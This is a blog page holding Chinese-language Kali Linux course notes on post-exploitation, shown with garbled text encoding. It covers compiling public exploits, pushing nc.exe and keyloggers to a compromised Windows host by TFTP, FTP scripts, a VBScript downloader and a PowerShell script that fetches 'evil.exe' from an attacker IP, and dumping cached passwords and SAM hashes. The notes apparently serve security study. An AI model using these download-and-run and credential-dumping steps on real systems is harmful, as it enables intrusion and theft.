<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;10&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/10/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/" itemprop="url">Kali Linuxç¬”è®°(äºŒåä¹)ï¼šåæ¼æ´åˆ©ç”¨é˜¶æ®µ</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-17T20:05:52+08:00">
                2019-12-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  2.4k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  10 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-é€‰æ‹©å’Œä¿®æ”¹EXP"><a href="#1-é€‰æ‹©å’Œä¿®æ”¹EXP" class="headerlink" title="1. é€‰æ‹©å’Œä¿®æ”¹EXP"></a>1. é€‰æ‹©å’Œä¿®æ”¹EXP</h4><ul>
<li>ç½‘ä¸Šå…¬å¼€çš„EXPä»£ç <ul>
<li>é€‰æ‹©å¯ä¿¡èµ–çš„EXPæºï¼ˆå­˜åœ¨æ¶æ„é»‘å®¢ç¼–é€ å‡çš„EXPï¼Œå› ä¸ºShellcodeéƒ½æ˜¯åå…­è¿›åˆ¶ï¼‰</li>
<li>Exploit-dbï¼ˆå®˜æ–¹ç»´æŠ¤çš„æ¼æ´æº¢å‡ºä»£ç åº“ï¼‰</li>
<li>SecurityFocus</li>
<li>Searchsploit</li>
<li>æœ‰èƒ½åŠ›ä¿®æ”¹EXPï¼ˆPythonã€Perlã€Rubyã€Cã€C++â€¦.ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="2-é€‰æ‹©å’Œä¿®æ”¹EXP"><a href="#2-é€‰æ‹©å’Œä¿®æ”¹EXP" class="headerlink" title="2. é€‰æ‹©å’Œä¿®æ”¹EXP"></a>2. é€‰æ‹©å’Œä¿®æ”¹EXP</h4><ul>
<li>646.c<ul>
<li>ç±»Unixç¯å¢ƒä¸‹ç¼–è¯‘</li>
<li>è¿”å›åœ°å€ä¸æˆ‘ä»¬çš„ç¯å¢ƒä¸æ­¢</li>
<li>åå¼¹shellç¡¬ç¼–ç äº†å›è¿IPåœ°å€</li>
<li>ç¼“å†²åŒºåç§»é‡ä¸æˆ‘ä»¬ç¯å¢ƒä¸ç¬¦</li>
<li>ç›®æ ‡IPç¡¬ç¼–ç </li>
</ul>
</li>
<li>646.c<ul>
<li>Windowsç¯å¢ƒä¸‹ç¼–è¯‘</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install mingw32 â–² 2019.12.16 æ›´æ”¹ä¸ºapt-get install mingw-w64</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼ši586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</code></strong> â–² 2019.12.16 æ›´æ”¹ä¸º i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwine sl.exe IPåœ°å€</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>exploitè„šæœ¬è·¯å¾„ï¼š/usr/share/exploitdb/exploits/windows/remote</code></pre></blockquote>
<ul>
<li>643.c<ul>
<li>Linuxç¯å¢ƒä¸‹ç¼–è¯‘</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šgcc 643.c -o 643</code></strong></li>
<li>Shellcodeï¼Œåç§»é‡ï¼ŒIPåœ°å€éœ€è¦è¢«æ›¿æ¢</li>
</ul>
</li>
</ul>
<h4 id="3-é¿å…æœ‰å®³çš„EXP"><a href="#3-é¿å…æœ‰å®³çš„EXP" class="headerlink" title="3. é¿å…æœ‰å®³çš„EXP"></a>3. é¿å…æœ‰å®³çš„EXP</h4><ul>
<li>ä¸åŒçš„EXP<ul>
<li>ä¸åŒçš„ç³»ç»Ÿè¡¥ä¸</li>
<li>è½¯ä»¶ç‰ˆæœ¬</li>
<li>ä¸åŒçš„offsetã€Shellcode</li>
</ul>
</li>
<li>æ‰«ææ¢æµ‹ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ï¼Œæ­å»ºé€‚å½“çš„æµ‹è¯•ç¯å¢ƒ<ul>
<li>é¿å…ä¸€é”¤å­æµ‹è¯•</li>
</ul>
</li>
<li>ä¿®æ”¹å…¬å¼€çš„EXPæ»¡è¶³ä¸åŒç¯å¢ƒéœ€è¦<ul>
<li>äº†è§£æ¼æ´åŸç†ï¼Œä¿®æ”¹æº¢å‡ºä»£ç </li>
</ul>
</li>
</ul>
<h4 id="4-åæ¼æ´åˆ©ç”¨é˜¶æ®µï¼ˆPOST-EXPLOITATIONï¼‰"><a href="#4-åæ¼æ´åˆ©ç”¨é˜¶æ®µï¼ˆPOST-EXPLOITATIONï¼‰" class="headerlink" title="4. åæ¼æ´åˆ©ç”¨é˜¶æ®µï¼ˆPOST EXPLOITATIONï¼‰"></a>4. åæ¼æ´åˆ©ç”¨é˜¶æ®µï¼ˆPOST EXPLOITATIONï¼‰</h4><ul>
<li>ä¸Šä¼ å·¥å…·ï¼ˆæ›´å¥½æ§åˆ¶æœåŠ¡å™¨ï¼‰</li>
<li>ææƒ</li>
<li>æ“¦é™¤æ”»å‡»ç—•è¿¹</li>
<li>å®‰è£…åé—¨ï¼ˆè¿›è¡Œé•¿æœŸçš„æ§åˆ¶ï¼‰<ul>
<li>é•¿æœŸæ§åˆ¶</li>
<li>Dumpå¯†ç </li>
<li>å†…ç½‘æ¸—é€</li>
</ul>
</li>
<li>åæ¼æ´åˆ©ç”¨é˜¶æ®µ<ul>
<li>æœ€å¤§çš„æŒ‘æˆ˜â€“é˜²ç—…æ¯’è½¯ä»¶ï¼ˆä¿¡æ¯åº“è¿›è¡ŒåŒ¹é…ï¼Œè½¯ä»¶ä¼šæ›´æ–°ï¼‰</li>
<li>ä½¿ç”¨åˆæ³•è¿œç¨‹æ§åˆ¶è½¯ä»¶</li>
</ul>
</li>
</ul>
<h4 id="5-æ¼æ´åˆ©ç”¨åé˜¶æ®µ"><a href="#5-æ¼æ´åˆ©ç”¨åé˜¶æ®µ" class="headerlink" title="5. æ¼æ´åˆ©ç”¨åé˜¶æ®µ"></a>5. æ¼æ´åˆ©ç”¨åé˜¶æ®µ</h4><ul>
<li>ä¸Šä¼ æ–‡ä»¶<ul>
<li>æŒä¹…æ§åˆ¶</li>
<li>æ‰©å¤§å¯¹ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶èƒ½åŠ›</li>
</ul>
</li>
<li>Linuxç³»ç»Ÿ<ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
</li>
<li>Windows<ul>
<li>ç¼ºå°‘é¢„è£…çš„ä¸‹è½½å·¥å…·</li>
</ul>
</li>
</ul>
<h4 id="6-æ¼æ´åˆ©ç”¨åé˜¶æ®µ"><a href="#6-æ¼æ´åˆ©ç”¨åé˜¶æ®µ" class="headerlink" title="6. æ¼æ´åˆ©ç”¨åé˜¶æ®µ"></a>6. æ¼æ´åˆ©ç”¨åé˜¶æ®µ</h4><ul>
<li>éäº¤äº’å¼shell<ul>
<li>ç±»NCè¿œç¨‹æ§åˆ¶shell</li>
<li>ftp 192.168.1.1ï¼ˆæ— æ³•è¿›è¡Œäº¤äº’ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>ncç›‘å¬ä¸‹æ¥çš„shellä¸æœ¬æœºçš„shellå­˜åœ¨ä¸åŒ
window xpå®‰è£…ftpï¼šappwiz.cpl â†’ Add â†’ IIS â†’ FTPï¼ˆå¯èƒ½éœ€è¦å®‰è£…å…‰ç›˜ï¼‰</code></pre></blockquote>
<h4 id="7-ä½¿ç”¨TFTPä¼ è¾“æ–‡ä»¶ï¼ˆè·¯ç”±å™¨OSæ›´æ–°ï¼ŒåŸºäºUDPï¼Œä¸æ”¯æŒèº«ä»½éªŒè¯ï¼‰"><a href="#7-ä½¿ç”¨TFTPä¼ è¾“æ–‡ä»¶ï¼ˆè·¯ç”±å™¨OSæ›´æ–°ï¼ŒåŸºäºUDPï¼Œä¸æ”¯æŒèº«ä»½éªŒè¯ï¼‰" class="headerlink" title="7. ä½¿ç”¨TFTPä¼ è¾“æ–‡ä»¶ï¼ˆè·¯ç”±å™¨OSæ›´æ–°ï¼ŒåŸºäºUDPï¼Œä¸æ”¯æŒèº«ä»½éªŒè¯ï¼‰"></a>7. ä½¿ç”¨TFTPä¼ è¾“æ–‡ä»¶ï¼ˆè·¯ç”±å™¨OSæ›´æ–°ï¼ŒåŸºäºUDPï¼Œä¸æ”¯æŒèº«ä»½éªŒè¯ï¼‰</h4><ul>
<li>XPã€2003é»˜è®¤å®‰è£…</li>
<li>Win7ã€2008éœ€è¦å•ç‹¬æ·»åŠ ï¼ˆä½œä¸ºæ“ä½œç³»ç»Ÿç»„ä»¶å•ç‹¬æ·»åŠ ï¼‰</li>
<li>ç»å¸¸è¢«è¾¹ç•Œé˜²ç«å¢™è¿‡æ»¤</li>
<li>Kali<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmkdir /tftp</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šchown -R nobody /tftp</code></strong>ï¼ˆä½œä¸ºæœåŠ¡ç¨‹åºçš„æƒé™ï¼Œè¾ƒä½ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp /usr/share/windows-binaries/nc.exe /tftp/</code></strong>ï¼ˆæ‹·è´éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šatftpd --daemon --port 69 /tftp</code></strong>ï¼ˆä½œä¸ºåç«¯ç¨‹åºï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>éœ€è¦æŠŠtftpdä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œç»„å±è®¾ç½®ä¸ºnobodyï¼Œæ‰èƒ½è¢«ä¸‹è½½</code></pre></blockquote>
<ul>
<li>Windows<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼štftp -i IPåœ°å€ get nc.exe</code></strong>  </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>tasklistæŸ¥çœ‹Windowè¿è¡Œçš„è¿›ç¨‹ï¼ˆexeï¼‰
klogger.exeè®°å½•é”®ç›˜æ•²å‡»çš„å­—ç¬¦</code></pre></blockquote>
<h4 id="8-åˆ©ç”¨FTPä¼ è¾“æ–‡ä»¶"><a href="#8-åˆ©ç”¨FTPä¼ è¾“æ–‡ä»¶" class="headerlink" title="8. åˆ©ç”¨FTPä¼ è¾“æ–‡ä»¶"></a>8. åˆ©ç”¨FTPä¼ è¾“æ–‡ä»¶</h4><ul>
<li>Kali<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install pure-ftpd</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./ftp.sh</code></strong>ï¼ˆftpé…ç½®æ–‡ä»¶ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span><br><span class="line">pure-pw useradd yuanfh -u ftpuser -d /ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line">cd /etc/pure-ftpd/auth/</span><br><span class="line">ln -s ../conf/PureDB 60pdb</span><br><span class="line">mkdir -p /ftphome</span><br><span class="line">chown -R ftpuser:ftpgroup /ftphome/</span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho open IPåœ°å€ 21&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho ç”¨æˆ·&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho å¯†ç &gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho bin&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho GET whoami.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho GET klogger.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šecho bye&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šftp -s:ftp.txt</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>éœ€è¦æ‹·è´è¦ä¸Šä¼ çš„æ–‡ä»¶åˆ°ftp serverçš„æ ¹ç›®å½•ä¸‹</code></pre></blockquote>
<h4 id="9-ä½¿ç”¨VBSCRIPTä¼ è¾“æ–‡ä»¶"><a href="#9-ä½¿ç”¨VBSCRIPTä¼ è¾“æ–‡ä»¶" class="headerlink" title="9. ä½¿ç”¨VBSCRIPTä¼ è¾“æ–‡ä»¶"></a>9. ä½¿ç”¨VBSCRIPTä¼ è¾“æ–‡ä»¶</h4><ul>
<li>Kali<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šservice apache2 start</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcd /var/www/html/</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>wget.vbs â–² 2019.12.17 XPç³»ç»ŸæŠ¥é”™ï¼šMicrosoft VBScript runtime errorä¸‹æ ‡è¶Šç•Œ</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting,FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True)&gt;&gt;wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffter = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter+1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows  <ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcscript wget.vbs http://IPåœ°å€/whoami.exe w.exe</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-ä½¿ç”¨POWERSHELLä¼ è¾“æ–‡ä»¶"><a href="#10-ä½¿ç”¨POWERSHELLä¼ è¾“æ–‡ä»¶" class="headerlink" title="10. ä½¿ç”¨POWERSHELLä¼ è¾“æ–‡ä»¶"></a>10. ä½¿ç”¨POWERSHELLä¼ è¾“æ–‡ä»¶</h4><ul>
<li>Kali <ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šservice apache2 start</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcd /var/www/html/</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>Wget.ps1 â–²2019.12.17æŠ¥é”™ï¼šwebclient.DownloadFile($url,$file)è¯·æ±‚æœŸé—´å‘ç”Ÿå¼‚å¸¸</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$storageDir = $pwd</span><br><span class="line">$webclient = New-Object System.Net.WebClient</span><br><span class="line">$url = &quot;http://IPåœ°å€/evil.exe&quot;</span><br><span class="line">$file = &quot;new-exploit.exe&quot;</span><br><span class="line">$webclient.DownloadFile($url,$file)</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼špowershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-ä½¿ç”¨DEBUGä¼ è¾“æ–‡ä»¶"><a href="#11-ä½¿ç”¨DEBUGä¼ è¾“æ–‡ä»¶" class="headerlink" title="11. ä½¿ç”¨DEBUGä¼ è¾“æ–‡ä»¶"></a>11. ä½¿ç”¨DEBUGä¼ è¾“æ–‡ä»¶</h4><ul>
<li>Debugï¼ˆWindows3.1å°±æœ‰Debugè¿™ä¸ªå‘½ä»¤ï¼‰<ul>
<li>æ±‡ç¼–ã€åæ±‡ç¼–</li>
<li>16è¿›åˆ¶dump</li>
<li>é»˜è®¤é™åˆ¶æ–‡æœ¬æ–‡ä»¶64Kå­—èŠ‚</li>
</ul>
</li>
<li>upxå‹ç¼©æ–‡ä»¶ï¼ˆå¯¹ä¼ è¾“æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œåœ¨Kaliä¸‹å‹ç¼©ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdebug&lt;123.hex</code></strong>  </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcopy 1.dll nc.exe</code></strong></li>
</ul>
<h4 id="12-æŠ“åŒ…å—…æ¢ï¼ˆåªèƒ½æŠ“è¯·æ±‚æœ¬åœ°æœåŠ¡çš„èº«ä»½éªŒè¯ï¼‰"><a href="#12-æŠ“åŒ…å—…æ¢ï¼ˆåªèƒ½æŠ“è¯·æ±‚æœ¬åœ°æœåŠ¡çš„èº«ä»½éªŒè¯ï¼‰" class="headerlink" title="12. æŠ“åŒ…å—…æ¢ï¼ˆåªèƒ½æŠ“è¯·æ±‚æœ¬åœ°æœåŠ¡çš„èº«ä»½éªŒè¯ï¼‰"></a>12. æŠ“åŒ…å—…æ¢ï¼ˆåªèƒ½æŠ“è¯·æ±‚æœ¬åœ°æœåŠ¡çš„èº«ä»½éªŒè¯ï¼‰</h4><ul>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeekï¼ˆå›¾å½¢åŒ–ç•Œé¢å¥½ï¼ŒåŠŸèƒ½å…¨ï¼‰</li>
<li>commview</li>
<li>Sniffpassï¼ˆåªæŠ“æœ‰å¯†ç çš„åŒ…ï¼Œæ— è®ºæœ‰æ— é”™å¯†ç ï¼Œéƒ½ä¼šæŠ“åŒ…ï¼‰</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniffï¼ˆåªæŠ“å¯†ç çš„ç¨‹åºï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<p>   dsniff -h<br>   dsniff -i eth0</p>
</blockquote>
<h4 id="13-é”®ç›˜è®°å½•"><a href="#13-é”®ç›˜è®°å½•" class="headerlink" title="13. é”®ç›˜è®°å½•"></a>13. é”®ç›˜è®°å½•</h4><ul>
<li>Keyloggerï¼ˆè®°å½•æ‰€æœ‰çš„é”®ç›˜æ•²å‡»ï¼‰</li>
<li>æœ¨é©¬çªƒå–ï¼ˆDarkComet-RATï¼‰</li>
</ul>
<h4 id="14-æœ¬åœ°ç¼“å­˜å¯†ç "><a href="#14-æœ¬åœ°ç¼“å­˜å¯†ç " class="headerlink" title="14. æœ¬åœ°ç¼“å­˜å¯†ç "></a>14. æœ¬åœ°ç¼“å­˜å¯†ç </h4><ul>
<li>æµè§ˆå™¨ç¼“å­˜çš„å¯†ç <ul>
<li>IE</li>
<li>Firefox</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Firefoxï¼šæµè§ˆå™¨è®°ä½çš„å¯†ç ï¼šPreferences â†’ Security â†’ saved Logins â†’ Show Passwords
IEï¼šInterneté€‰é¡¹ â†’ å†…å®¹ â†’ è‡ªåŠ¨å®Œæˆè®¾ç½® â†’ ç®¡ç†å¯†ç 
Window7ï¼šè¿è¡Œ â†’ appwiz.cpl â†’ æ§åˆ¶é¢æ¿ â†’ ç”¨æˆ· â†’ å‡­æ®ç®¡ç†å™¨</code></pre></blockquote>
<ul>
<li>ç½‘ç»œå¯†ç </li>
<li>æ— çº¿å¯†ç </li>
<li><a href="http://www.nirsoft.netï¼ˆé›†æˆå·¥å…·ï¼‰" target="_blank" rel="noopener">http://www.nirsoft.netï¼ˆé›†æˆå·¥å…·ï¼‰</a></li>
</ul>
<blockquote>
<pre><code>Remote Desktop PassView è¿œç¨‹æ¡Œé¢æ˜¾ç¤ºï¼Œå¯¹rdpæ–‡ä»¶è¿›è¡Œè¯»å–</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>Pwdumpï¼ˆå¯è¿œç¨‹æ‰§è¡Œï¼Œéœ€è¦IPï¼Œç”¨æˆ·ä»¥åŠå¯†ç ï¼‰</li>
